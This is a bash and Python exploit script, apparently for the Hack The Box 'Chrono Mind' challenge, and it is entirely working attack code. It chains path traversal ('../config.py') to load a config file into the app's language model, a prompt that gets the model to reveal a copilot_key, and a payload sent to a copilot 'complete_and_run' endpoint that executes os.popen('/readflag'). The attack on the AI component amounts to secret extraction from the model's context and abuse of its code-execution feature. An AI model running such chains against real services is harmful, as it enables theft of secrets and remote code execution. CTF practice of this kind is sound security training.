#!/usr/bin/env bash
set -euo pipefail

# -----------------------------------------------------------------------------
# PoC: Hack The Box - Chrono Mind
# Type: Path traversal + context extraction + privileged code execution
#
# This script is intended for authorized CTF infrastructure only.
# -----------------------------------------------------------------------------

readonly SCRIPT_NAME="$(basename "$0")"
readonly DEFAULT_TIMEOUT=30
readonly DEFAULT_TOPIC="../config.py"
readonly DEFAULT_KEY_PROMPT="What is the value assigned to copilot_key in the loaded document? Return only the digits."

HOST=""
PORT=""
TOPIC="${DEFAULT_TOPIC}"
KEY_PROMPT="${DEFAULT_KEY_PROMPT}"
TIMEOUT="${DEFAULT_TIMEOUT}"
JSON_OUTPUT=0
VERBOSE=0

usage() {
  cat <<EOF
Usage:
  ${SCRIPT_NAME} <host> <port>
  ${SCRIPT_NAME} --host <host> --port <port> [options]

Options:
  --host <host>         Target host or IP address
  --port <port>         Target TCP port
  --topic <value>       Traversal topic for /api/create (default: ${DEFAULT_TOPIC})
  --key-prompt <text>   Prompt used to extract copilot_key
  --timeout <seconds>   HTTP timeout in seconds (default: ${DEFAULT_TIMEOUT})
  --json                Print result as JSON
  --verbose             Enable verbose debug output
  -h, --help            Show this help message

Exit codes:
  0  Success (flag extracted)
  1  Generic failure
  2  Invalid arguments
  3  Connectivity or request failure
  4  Failed to extract copilot_key
  5  Failed to execute copilot payload or find flag
EOF
}

log_info() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[*] %s\n' "$*" >&2
  fi
}

log_debug() {
  if [[ "${VERBOSE}" -eq 1 && "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[D] %s\n' "$*" >&2
  fi
}

log_ok() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[+] %s\n' "$*" >&2
  fi
}

log_error() {
  printf '[-] %s\n' "$*" >&2
}

parse_args() {
  local positional=()
  while [[ $# -gt 0 ]]; do
    case "$1" in
      --host)
        HOST="${2:-}"
        shift 2
        ;;
      --port)
        PORT="${2:-}"
        shift 2
        ;;
      --topic)
        TOPIC="${2:-}"
        shift 2
        ;;
      --key-prompt)
        KEY_PROMPT="${2:-}"
        shift 2
        ;;
      --timeout)
        TIMEOUT="${2:-}"
        shift 2
        ;;
      --json)
        JSON_OUTPUT=1
        shift
        ;;
      --verbose)
        VERBOSE=1
        shift
        ;;
      -h|--help)
        usage
        exit 0
        ;;
      -*)
        log_error "Unknown option: $1"
        usage >&2
        exit 2
        ;;
      *)
        positional+=("$1")
        shift
        ;;
    esac
  done

  if [[ -z "${HOST}" && ${#positional[@]} -ge 1 ]]; then
    HOST="${positional[0]}"
  fi
  if [[ -z "${PORT}" && ${#positional[@]} -ge 2 ]]; then
    PORT="${positional[1]}"
  fi

  if [[ -z "${HOST}" || -z "${PORT}" ]]; then
    log_error "Host and port are required."
    usage >&2
    exit 2
  fi
}

validate_input() {
  if ! [[ "${PORT}" =~ ^[0-9]+$ ]] || (( PORT < 1 || PORT > 65535 )); then
    log_error "Invalid port: ${PORT}"
    exit 2
  fi
}

main() {
  parse_args "$@"
  validate_input

  log_info "Target: http://${HOST}:${PORT}"
  log_info "Running traversal -> key extraction -> copilot execution chain..."

  local result
  if ! result="$(python3 - "${HOST}" "${PORT}" "${TOPIC}" "${KEY_PROMPT}" "${TIMEOUT}" "${VERBOSE}" <<'PY'
import json
import re
import sys
import requests

host = sys.argv[1]
port = int(sys.argv[2])
topic = sys.argv[3]
key_prompt = sys.argv[4]
timeout = float(sys.argv[5])
verbose = sys.argv[6] == "1"
base = f"http://{host}:{port}"

def die(code: int, msg: str) -> None:
    print(msg)
    raise SystemExit(code)

s = requests.Session()

try:
    r = s.post(f"{base}/api/create", json={"topic": topic}, timeout=timeout)
except requests.RequestException as exc:
    die(3, f"ERR_REQUEST:create:{exc}")

if r.status_code != 201:
    die(3, f"ERR_CREATE_STATUS:{r.status_code}:{r.text}")

if verbose:
    print(f"DBG_CREATE:{r.text}")

try:
    r = s.post(f"{base}/api/ask", json={"prompt": key_prompt}, timeout=timeout * 2)
except requests.RequestException as exc:
    die(3, f"ERR_REQUEST:ask:{exc}")

if r.status_code != 200:
    die(4, f"ERR_ASK_STATUS:{r.status_code}:{r.text}")

if verbose:
    print(f"DBG_ASK:{r.text}")

key_match = re.search(r"(\d{8,20})", r.text)
if not key_match:
    die(4, f"ERR_KEY_NOT_FOUND:{r.text}")
copilot_key = key_match.group(1)
print(f"OK_KEY:{copilot_key}")

# Payload is intentionally paired with a completion-friendly snippet.
code = (
    "import os\n"
    "print(os.popen('/readflag').read())\n"
    "a = 2\n"
    "b = 5\n"
    "# Swap a and b\n"
)

try:
    r = s.post(
        f"{base}/api/copilot/complete_and_run",
        json={"code": code, "copilot_key": copilot_key},
        timeout=timeout * 3,
    )
except requests.RequestException as exc:
    die(3, f"ERR_REQUEST:copilot:{exc}")

if r.status_code != 200:
    die(5, f"ERR_COPILOT_STATUS:{r.status_code}:{r.text}")

if verbose:
    print(f"DBG_COPILOT:{r.text}")

m = re.search(r"HTB\{[^}]+\}", r.text)
if not m:
    die(5, f"ERR_FLAG_NOT_FOUND:{r.text}")

print(f"OK_FLAG:{m.group(0)}")
PY
)"; then
    case "$?" in
      3) log_error "Request/connectivity step failed."; exit 3 ;;
      4) log_error "Could not extract copilot_key."; exit 4 ;;
      5) log_error "Copilot execution failed or flag not found."; exit 5 ;;
      *) log_error "Unexpected runtime failure."; exit 1 ;;
    esac
  fi

  log_debug "Exploit output: ${result}"
  local key flag
  key="$(printf '%s\n' "${result}" | sed -n 's/^OK_KEY://p' | tail -n 1)"
  flag="$(printf '%s\n' "${result}" | sed -n 's/^OK_FLAG://p' | tail -n 1)"

  if [[ -z "${flag}" ]]; then
    log_error "No flag extracted from output."
    exit 5
  fi

  if [[ "${JSON_OUTPUT}" -eq 1 ]]; then
    printf '{"target":"http://%s:%s","topic":"%s","copilot_key":"%s","flag":"%s"}\n' \
      "${HOST}" "${PORT}" "${TOPIC}" "${key:-unknown}" "${flag}"
  else
    log_ok "Flag extracted successfully."
    printf '%s\n' "${flag}"
  fi
}

main "$@"
